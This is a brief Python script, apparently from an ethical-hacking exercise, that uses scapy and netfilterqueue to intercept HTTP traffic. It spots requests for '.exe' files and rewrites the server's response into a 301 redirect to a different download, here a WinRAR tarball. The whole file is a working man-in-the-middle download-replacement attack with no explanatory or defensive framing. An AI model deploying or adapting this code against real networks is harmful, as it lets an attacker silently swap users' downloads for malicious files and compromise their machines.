#!/usr/bin/env python
import scapy.all as scapy
import netfilterqueue

ack_list = []

def setload(scapy_packet, load):
    scapy_packet[scapy.Raw].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum
    return scapy_packet

def netfilter(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            #print("HTTP Request")
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe request")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80:
            #print("HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = setload(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.win-rar.com/fileadmin/winrar-versions/rarlinux-x64-5.9.0.tar.gz\n\n")
                packet.set_payload(str(modified_packet))
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, netfilter)
queue.run()
